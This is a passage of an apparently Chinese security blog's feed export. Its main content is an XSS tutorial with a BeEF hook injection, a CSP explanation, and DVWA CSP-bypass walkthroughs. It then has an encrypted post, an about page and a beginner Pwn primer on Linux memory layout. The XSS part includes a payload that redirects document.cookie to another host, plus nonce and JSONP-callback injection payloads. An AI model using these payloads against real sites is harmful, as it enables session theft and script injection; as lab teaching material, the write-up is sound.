<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?default=English#&lt;script src=&quot;http://192.168.152.128:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p>成功上线 BeEF。</p>
<p> <img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20230927193324140.png"
                      alt="image-20230927193324140"
                ></p>
<h2 id="XSS进阶"><a href="#XSS进阶" class="headerlink" title="XSS进阶"></a>XSS进阶</h2><h3 id="CSP简述"><a href="#CSP简述" class="headerlink" title="CSP简述"></a>CSP简述</h3><p>CSP（Content Security Policy，内容安全策略），是网页应用中常见的一种安全保护机制，采取白名单制度，开发者告诉客户端，哪些外部资源可以加载和执行，哪些不可以。通过 <code>HTTP</code> 消息头或者 <code>HTML</code> 的 <code>Meta</code> 标签中设置。正常 <code>CSP</code> 有多组策略组成，每组策略包含一个策略指令和内容源列表。</p>
<ul>
<li><p>通过<code>HTTP</code>消息头设置：</p>
<div class="highlight-container" data-rel="Http"><figure class="iseeu highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Security-policy</span><span class="punctuation">: </span>default-src &#x27;self&#x27;; script-src &#x27;self&#x27; allowed.com; img-src &#x27;self&#x27; allowed.com; style-src &#x27;self&#x27;;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>通过<code>HTML</code> 的 <code>Meta</code> 标签中设置：</p>
<div class="highlight-container" data-rel="Html"><figure class="iseeu highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span> <span class="attr">content</span>=<span class="string">&quot;default-src &#x27;self&#x27;; img-src https://*; child-src &#x27;none&#x27;;&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure></div></li>
</ul>
<p><strong>CSP指令</strong></p>
<ul>
<li>script-src：外部脚本</li>
<li>style-src：样式表</li>
<li>img-src：图像</li>
<li>media-src：媒体文件（音频和视频）</li>
<li>font-src：字体文件</li>
<li>object-src：插件（比如 Flash）</li>
<li>child-src：框架</li>
<li>frame-ancestors：嵌入的外部资源（比如<code>&lt;frame&gt;</code>、<code>&lt;iframe&gt;</code>、<code>&lt;embed&gt;</code>和<code>&lt;applet&gt;</code>）</li>
<li>connect-src：HTTP 连接（通过 XHR、WebSockets、EventSource等）</li>
<li>worker-src：worker脚本</li>
<li>manifest-src：manifest 文件</li>
<li>dedault-src：默认配置</li>
<li>frame-ancestors：限制嵌入框架的网页</li>
<li>base-uri：限制&lt;base#href&gt;</li>
<li>form-action：限制&lt;form#action&gt;</li>
<li>block-all-mixed-content：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）</li>
<li>upgrade-insecure-requests：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议</li>
<li>plugin-types：限制可以使用的插件格式</li>
<li>sandbox：浏览器行为的限制，比如不能有弹出窗口等。</li>
</ul>
<p><strong>CSP指令值</strong></p>
<ul>
<li>*： 星号表示允许任何URL资源，没有限制；</li>
<li>self： 表示仅允许来自同源（相同协议、相同域名、相同端口）的资源被页面加载；</li>
<li>data：仅允许数据模式（如Base64编码的图片）方式加载资源；</li>
<li>none：不允许任何资源被加载；</li>
<li>unsafe-inline：允许使用内联资源，例如内联<code>&lt;script&gt;</code>标签，内联事件处理器，内联<code>&lt;style&gt;</code>标签等，但出于安全考虑，不建议使用；</li>
<li>nonce：通过使用一次性加密字符来定义可以执行的内联js脚本，服务端生成一次性加密字符并且只能使用一次；</li>
</ul>
<h3 id="CSP绕过"><a href="#CSP绕过" class="headerlink" title="CSP绕过"></a><a class="link"   href="https://zhuanlan.zhihu.com/p/368865224" >CSP绕过 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></h3><h4 id="location-href绕过"><a href="#location-href绕过" class="headerlink" title="location.href绕过"></a>location.href绕过</h4><p>很多网站常常不得已需要执行内联，CSP不影响location.href跳转。我们可以借此执行 <code>JavaScript</code>，也可以利用 <code>loction</code>跳转外带数据。</p>
<p><strong>location-herf.php</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    if (!isset($_COOKIE[&#x27;a&#x27;])) &#123;</span><br><span class="line">        setcookie(&#x27;a&#x27;,md5(rand(0,1000)));</span><br><span class="line">    &#125;</span><br><span class="line">        header(&quot;Content-Security-Policy: default-src &#x27;self&#x27;;&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;CSP Test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h2&gt;CSP-safe&lt;/h2&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">    if (isset($_GET[&#x27;a&#x27;])) &#123;</span><br><span class="line">        echo &quot;Your GET content&quot;.@$_GET[&#x27;a&#x27;];</span><br><span class="line">    &#125;//</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231007165318034.png"
                      alt="image-20231007165318034"
                ></p>
<p><strong>payload</strong></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">?a=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">location.<span class="property">href</span>=<span class="string">&quot;http://127.0.0.1&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231007165343194.png"
                      alt="image-20231007165343194"
                ></p>
<h4 id="dvwa-例题-3"><a href="#dvwa-例题-3" class="headerlink" title="dvwa 例题"></a>dvwa 例题</h4><h5 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h5><ul>
<li>源码</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27; https://pastebin.com hastebin.com www.toptal.com example.com code.jquery.com https://ssl.google-analytics.com ;&quot;; // allows js from self, pastebin.com, hastebin.com, jquery and google analytics.</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line"># These might work if you can&#x27;t create your own for some reason</span><br><span class="line"># https://pastebin.com/raw/R570EE00</span><br><span class="line"># https://www.toptal.com/developers/hastebin/raw/cezaruzeka</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if (isset ($_POST[&#x27;include&#x27;])) &#123;</span><br><span class="line">$page[ &#x27;body&#x27; ] .= &quot;</span><br><span class="line">    &lt;script src=&#x27;&quot; . $_POST[&#x27;include&#x27;] . &quot;&#x27;&gt;&lt;/script&gt;</span><br><span class="line">&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$page[ &#x27;body&#x27; ] .= &#x27;</span><br><span class="line">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">    &lt;p&gt;You can include scripts from external sources, examine the Content Security Policy and enter a URL to include here:&lt;/p&gt;</span><br><span class="line">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&#x27;;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 白名单</span><br><span class="line">https://pastebin.com</span><br><span class="line">hastebin.com</span><br><span class="line">example.com</span><br><span class="line">code.jquery.com</span><br><span class="line">https://ssl.google-analytics.com</span><br></pre></td></tr></table></figure></div>

<p>headerCSP 放置了一些 url，使用 script src 指令 指向一个外部 JavaScript 文件，header() 函数以原始形式将 HTTP 标头发送到客户端或浏览器，源码对 HTTP 头定义了 CSP 标签，从而定义了可以接受外部 JavaScript 资源的白名单。</p>
<ul>
<li>Attack</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011111416286.png"
                      alt="image-20231011111416286"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011111726446.png"
                      alt="image-20231011111726446"
                ></p>
<p>首先在白名单网站<code>https://pastebin.com/</code>里边创建一个 <code>JavaScript</code> 代码<code>alert(&quot;XSS&quot;)</code>保存记住链接<code>eg: https://pastebin.com/raw/Qp0pTUvF</code>。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011111850527.png"
                      alt="image-20231011111850527"
                ></p>
<p>输入后，点击<code>include</code>。因为网站在是国外的，访问较慢，可能不会出现弹窗。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011112448886.png"
                      alt="image-20231011112448886"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011112509622.png"
                      alt="image-20231011112509622"
                > </p>
<p>抓包看一下，请求已经发送出去了。</p>
<h5 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h5><ul>
<li>源码</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27; &#x27;unsafe-inline&#x27; &#x27;nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&#x27;;&quot;;</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line">// Disable XSS protections so that inline alert boxes will work</span><br><span class="line">header (&quot;X-XSS-Protection: 0&quot;);</span><br><span class="line"></span><br><span class="line"># &lt;script nonce=&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;&gt;alert(1)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if (isset ($_POST[&#x27;include&#x27;])) &#123;</span><br><span class="line">$page[ &#x27;body&#x27; ] .= &quot;</span><br><span class="line">    &quot; . $_POST[&#x27;include&#x27;] . &quot;</span><br><span class="line">&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$page[ &#x27;body&#x27; ] .= &#x27;</span><br><span class="line">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">    &lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt;</span><br><span class="line">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&#x27;;</span><br></pre></td></tr></table></figure></div>

<p><code>CSP</code> 策略尝试使用 <code>nonce</code> 来防止攻击者添加内联脚本。<code>HTTP</code> 头信息中的 <code>script-src</code> 的合法来源发生了变化。<code>script-src</code> 还可以设置一些特殊值，<code>unsafe-inline</code> 允许执行页面内嵌的 <code>&lt;script&gt;</code>标签和事件监听函数，<code>nonce</code> 值会在每次 <code>HTTP</code> 回应给出一个授权 <code>token</code>。</p>
<ul>
<li>Attack</li>
</ul>
<p><code>payload</code>:</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script nonce=<span class="string">&quot;TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=&quot;</span>&gt;<span class="title function_">alert</span>(<span class="string">&quot;XSS&quot;</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011114921730.png"
                      alt="image-20231011114921730"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011114940467.png"
                      alt="image-20231011114940467"
                ></p>
<p>直接通过内联 <code>JavaScript</code> 代码，注入时直接令 <code>nonce</code> 为设定好的值即可。</p>
<h5 id="High"><a href="#High" class="headerlink" title="High"></a>High</h5><ul>
<li>源码</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// high.php</span><br><span class="line">&lt;?php</span><br><span class="line">$headerCSP = &quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;;</span><br><span class="line"></span><br><span class="line">header($headerCSP);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">if (isset ($_POST[&#x27;include&#x27;])) &#123;</span><br><span class="line">$page[ &#x27;body&#x27; ] .= &quot;</span><br><span class="line">    &quot; . $_POST[&#x27;include&#x27;] . &quot;</span><br><span class="line">&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$page[ &#x27;body&#x27; ] .= &#x27;</span><br><span class="line">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">    &lt;p&gt;The page makes a call to &#x27; . DVWA_WEB_PAGE_TO_ROOT . &#x27;/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt;</span><br><span class="line">    &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span><br><span class="line">    &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;script src=&quot;source/high.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&#x27;;</span><br></pre></td></tr></table></figure></div>

<p>源代码的 <code>CSP:</code> <code>&quot;Content-Security-Policy: script-src ‘self’;&quot;</code> 意思是只能从本页面调用 <code>javascript</code> 脚本。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// high.js</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">clickButton</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> s = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>);</span><br><span class="line">    s.<span class="property">src</span> = <span class="string">&quot;source/jsonp.php?callback=solveSum&quot;</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">solveSum</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;answer&quot;</span> <span class="keyword">in</span> obj) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;answer&quot;</span>).<span class="property">innerHTML</span> = obj[<span class="string">&#x27;answer&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> solve_button = <span class="variable language_">document</span>.<span class="property">getElementById</span> (<span class="string">&quot;solve&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (solve_button) &#123;</span><br><span class="line">    solve_button.<span class="title function_">addEventListener</span>(<span class="string">&quot;click&quot;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="title function_">clickButton</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>点击网页的按钮使 <code>js</code> 生成一个 <code>script</code> 标签，<code>src</code> 指向 <code>source/jsonp.php?callback=solveNum</code>。<code>appendChild()</code> 方法把 <code>“source/jsonp.php?callback=solveNum”</code> 加入到 DOM 中。 <code>solveNum()</code> 函数传入参数 <code>obj</code>，如果字符串 <code>“answer”</code>  在 <code>obj</code> 中就会执行。<code>getElementById()</code> 方法可返回对拥有指定 <code>ID</code> 的第一个对象的引用，<code>innerHTML</code> 属性设置或返回表格行的开始和结束标签之间的 <code>HTML</code>。这里的 <code>script</code> 标签会把远程加载的 <code>solveSum(&#123;&quot;answer&quot;:&quot;15&quot;&#125;)</code> 当作 <code>js</code> 代码执行， 然后这个函数就会在页面显示答案。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">// josnp.php</span><br><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type: application/json; charset=UTF-8&quot;);</span><br><span class="line"></span><br><span class="line">if (array_key_exists (&quot;callback&quot;, $_GET)) &#123;</span><br><span class="line">	$callback = $_GET[&#x27;callback&#x27;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	return &quot;&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$outp = array (&quot;answer&quot; =&gt; &quot;15&quot;);</span><br><span class="line"></span><br><span class="line">echo $callback . &quot;(&quot;.json_encode($outp).&quot;)&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div>

<p><code>json.php</code> 中的参数通过 <code>get</code> 方式获取，且没有做过滤。</p>
<ul>
<li>Attack</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/09/26/Web%E5%AE%89%E5%85%A8(0x1)XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/image-20231011155419031.png"
                      alt="image-20231011155419031"
                ></p>
<p>通过 <code>POST</code> 传参将 <code>payload:</code> <code>include=&lt;script src=&quot;source/jsonp.php?callback=alert(&#39;xss&#39;);&quot;&gt;&lt;/script&gt;</code> 上传即可。</p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title>关于博客</title>
    <url>/2023/09/20/%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%AE%A2/</url>
    <content><![CDATA[<h3 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h3><p><strong>主要用来记载Pwn、IOT和Linux&amp;Win内核等相关内容。有些文章内容都比较长，不太喜欢分块写。</strong></p>
<h3 id="其他的"><a href="#其他的" class="headerlink" title="其他的"></a>其他的</h3><p><strong>记录一些琐碎。</strong></p>
]]></content>
      <categories>
        <category>Archives</category>
      </categories>
  </entry>
  <entry>
    <title>如何黑掉一颗卫星</title>
    <url>/2023/10/17/%E5%A6%82%E4%BD%95%E9%BB%91%E6%8E%89%E4%B8%80%E9%A2%97%E5%8D%AB%E6%98%9F/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fe8cc9e8e651bf10bdee690168d10acac9993d74dcd4c5262dc9763cc6c56acc">2d806215ddc7c4fd1f6babc1a9ab678d5631f1876bfd11d63fd6ecbf724f9357</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>HAS</category>
      </categories>
      <tags>
        <tag>HAS</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学笔记</title>
    <url>/2023/10/24/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fe8cc9e8e651bf10bdee690168d10acac9993d74dcd4c5262dc9763cc6c56acc">2d806215ddc7c4fd1f6babc1a9ab678d5631f1876bfd11d63fd6ecbf724f9357</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-swup-reload-script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
  </entry>
  <entry>
    <title>深入理解Pwn_Base_knowledge</title>
    <url>/2023/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Base_knowledge/</url>
    <content><![CDATA[<h1 id="Linux进程布局及ELF文件结构"><a href="#Linux进程布局及ELF文件结构" class="headerlink" title="Linux进程布局及ELF文件结构"></a>Linux进程布局及ELF文件结构</h1><p>这里的讲解并不是很深入，只是浅浅的做了些提示，本文内容是原本准备讲课的提示词，现在在做课程升级，就把之前想要讲课用的内容放在这里。</p>
<h2 id="虚拟地址"><a href="#虚拟地址" class="headerlink" title="虚拟地址"></a>虚拟地址</h2><p>操作系统加载可执行文件后，创建了一个进程，这个进程就有了自己的虚拟地址空间，每个进程的虚拟地址空间都一样。</p>
<h2 id="Linux-进程布局"><a href="#Linux-进程布局" class="headerlink" title="Linux 进程布局"></a>Linux 进程布局</h2><h3 id="32位布局"><a href="#32位布局" class="headerlink" title="32位布局"></a>32位布局</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Base_knowledge/x32.png"
                      alt="x32"
                ></p>
<ul>
<li><code>Kernel space</code>：<code>0xFFFFFFFF-&gt;0xC0000000</code> 这 <code>1GB</code> 大小的空间被分为内核空间，用户进程无法直接访问内核的虚拟内存空间，仅能通过系统调用来进入内核态，从而来访问指定的内核空间地址。</li>
<li><code>Stack</code>：在用户空间的最顶部的部分被叫做栈空间，它一般用于存放函数参数或局部变量，进程中的每一个线程都有属于自己的栈栈由高地址向低地址增长。</li>
<li><code>Mmap</code>：内核将文件内容映射在此这里，例如加载动态链接库。另外，在 <code>Linux</code> 中，如果你通过 <code>malloc</code> 函数申请一块大于<code>MMAP_THRESHOLD</code> (默认为128KB)大小的堆空间时，<code>glibc</code> 会返回一块匿名的 <code>mmap</code> 内存块而非一块堆内存，也就是匿名映射。</li>
<li><code>Heap</code>：堆同栈一样，都是为进程运行提供动态的内存分配，但其和栈的的一个很大区别在于堆上内存的生命期和执行分配的函数的生命期不一致，堆上分配的内存只有在对应进程通过系统调用主动释放或进程结束后才会释放。</li>
<li><code>BSS</code>：用来存放未初始化的全局或静态变量，程序加载时初始化为 <code>0</code>。</li>
<li><code>Data</code>：用来存放初始化的全局或者静态变量。</li>
<li><code>Text</code>：这段中存有程序的指令代码。<code>Text</code> 段是通过只读的方式加载到内存中的，他在多个进程中是可以被安全共享的。</li>
<li><code>0x00000000~0x80480000</code>：<code>Reserve</code>（保留区），用户不可访问。</li>
</ul>
<h3 id="x64进程布局"><a href="#x64进程布局" class="headerlink" title="x64进程布局"></a>x64进程布局</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Base_knowledge/x64.png"
                      alt="x64"
                ></p>
<p>源码：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *data = <span class="string">&quot;hello data&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> bss[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> a;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> b = <span class="number">1</span>;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;a==&gt;%d, b==&gt;%d&quot;</span>, a, b);</span><br><span class="line">	<span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="二进制简介"><a href="#二进制简介" class="headerlink" title="二进制简介"></a>二进制简介</h2><p>计算机使用二进制系统执行计算，系统执行的机器码被称为二进制代码，二进制文件包含每个程序的所有代码和数据。</p>
<h3 id="C语言编译过程"><a href="#C语言编译过程" class="headerlink" title="C语言编译过程"></a>C语言编译过程</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2023/12/09/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_Base_knowledge/image-20231109145303530.png"
                      alt="image-20231109145303530"
                ></p>
<ul>
<li><strong>预处理阶段</strong>：处理<code>#define</code>和<code>#include</code>指令。</li>
</ul>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">gcc -E -P compilation_example.c</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>编译阶段</strong>：将纯C代码转换为汇编语言，编译器优化。</li>
</ul>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">gcc -S -masm=intel compilation_example.c</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>汇编阶段</strong>：将汇编代码转换成机器码，生成可重定位的二进制文件。</li>
</ul>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">gcc -c compilation_example.c</span><br></pre></td></tr></table></figure></div>

<ul>
<li><strong>链接阶段</strong>：将所有对象文件链接到一个二进制可执行文件，静态库合并到二进制可执行文件，留下符号引用，被动态链接器用来解析动态库的最终依赖关系。</li>
</ul>
<div class="highlight-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="code"><pre><span class="line">gcc compilation_example.c</span><br></pre></td></tr></table></figure></div>

<p>源码：</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FORMAT <span class="string">&quot;%s&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MESSAGE <span class="string">&quot;Hello, World\n&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> <span class="type">const</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(FORMAT, MESSAGE);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

